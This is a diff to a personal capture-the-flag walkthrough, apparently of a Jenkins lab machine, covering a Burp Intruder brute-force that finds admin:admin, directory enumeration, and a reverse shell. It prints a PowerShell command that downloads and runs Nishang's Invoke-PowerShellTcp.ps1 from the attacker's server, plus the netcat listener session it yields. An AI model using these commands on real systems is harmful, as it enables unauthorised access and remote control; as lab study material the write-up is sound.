@@ -66,7 +66,9 @@ Considering the answer expected is *****:*****, with consideration of the names 
 - Fill user name and password box with easily identifiable locators, the select "sign in".
 - That is captured in burpe suite check the login details are listed and forward to intruder.
 - Use cluster bomb not sniper mode as more than one variable and assign wordlists to each variable then start attack.
-- The output will all be status code 302, but the headers are what vary, only admin:admin are successful.
+- The output will all be status code 302, but the headers are what vary. 
+
+Answer: Only admin:admin are successful.
 
 Unsuccessful (admin:wayne)
 ```
@@ -91,4 +93,49 @@ Location: http://10.49.152.15:8080/
 Content-Length: 0
 Server: Jetty(9.4.z-SNAPSHOT)
 ```
+It was also worth considering some applications with java used to have password hardcoded into the applications. so it was worth looking at gobuster to check what folders or files could be enumerated. No real luck  the two files with status code 200 the reset 
 
+
+Q4: Find a feature of the tool that allows you to execute commands on the underlying system. When you find this feature, you can use this command to get the reverse shell on your machine and then run it: powershell iex (New-Object Net.WebClient).DownloadString('http://your-ip:your-port/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress your-ip -Port your-port
+
+You first need to download the Powershell script and make it available for the server to download. You can do this by creating an http server with python: python3 -m http.server
+Answer: no response required.
+
+This requires the use of Nishang tool kit mentioned earlier. 
+Download, go to shells folder and start a python3 htt.server to allow download from server end.
+```
+root@ip-10-49-76-50:~# git clone https://github.com/samratashok/nishang
+Cloning into 'nishang'...
+...
+root@ip-10-49-76-50:~# cd nishang/Shells
+root@ip-10-49-76-50:~/nishang/Shells# ls
+Invoke-ConPtyShell.ps1               Invoke-PowerShellTcp.ps1
+Invoke-JSRatRegsvr.ps1               Invoke-PowerShellUdpOneLine.ps1
+Invoke-JSRatRundll.ps1               Invoke-PowerShellUdp.ps1
+Invoke-PoshRatHttp.ps1               Invoke-PowerShellWmi.ps1
+Invoke-PoshRatHttps.ps1              Invoke-PsGcatAgent.ps1
+Invoke-PowerShellIcmp.ps1            Invoke-PsGcat.ps1
+Invoke-PowerShellTcpOneLineBind.ps1  Remove-PoshRat.ps1
+Invoke-PowerShellTcpOneLine.ps1
+root@ip-10-49-76-50:~/nishang/Shells# python3 -m http.server 8000
+Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
+10.49.152.15 - - [05/Apr/2026 13:03:02] "GET /Invoke-PowerShellTcp.ps1 HTTP/1.1" 200 -
+
+File downloaded successfully.
+```
+```
+oot@ip-10-49-76-50:~/nishang/Shells# nc -lnvp 4443
+Listening on 0.0.0.0 4443
+Connection received on 10.49.152.15 49370
+Windows PowerShell running as user bruce on ALFRED
+Copyright (C) 2015 Microsoft Corporation. All rights reserved.
+
+PS C:\Program Files (x86)\Jenkins\workspace\project>Get-ChildItem -Path C:\ -Recurse -Filter "user.txt" -ErrorAction SilentlyContinue
+
+    Directory: C:\Users\bruce\Desktop
+
+Mode                LastWriteTime     Length Name                              
+----                -------------     ------ ----                              
+-a---        10/25/2019  11:22 PM         32 user.txt                          
+
+```
